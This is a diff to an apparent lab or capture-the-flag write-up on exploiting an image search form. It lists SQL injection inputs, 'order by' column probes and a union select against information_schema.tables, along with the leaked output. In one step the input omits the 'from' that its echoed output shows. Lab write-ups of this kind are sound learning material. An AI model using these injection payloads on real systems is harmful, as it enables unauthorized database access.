@@ -8,10 +8,45 @@
 ## exploit
 Home -> SEARCH IMAGE
 
-1. see the behavior
-`
-`
-2. 
+1. see the form behavior<br/>
+input -> output<br/>
+`1` ->
+`ID: 1 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_`<br/>
+`2` ->
+`ID: 2 
+Title: 42 !
+Url : https://fr.wikipedia.org/wiki/Fichier:42`
+
+
+2. error based SQL injection<br/>
+input -> output<br/>
+`1 order by 1--` ->
+`ID: 1 order by 1-- 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_`<br/>
+`1 order by 2--` ->
+`ID: 1 order by 2-- 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_`<br/>
+`1 order by 3--` -> ` ` (no output)<br/>
+We can assume there are 2 columns extracted from table.
+
+
+3. union based SQL injection<br/>
+input -> output<br/>
+`1 union select null, table_name information_schema.tables--`
+->
+`ID: 1 union select null, table_name from information_schema.tables-- 
+Title: Nsa
+Url : https://fr.wikipedia.org/wiki/Programme_
+...
+ID: 1 union select null, table_name from information_schema.tables-- 
+Title: list_images
+Url : `
+
+
 
 
 
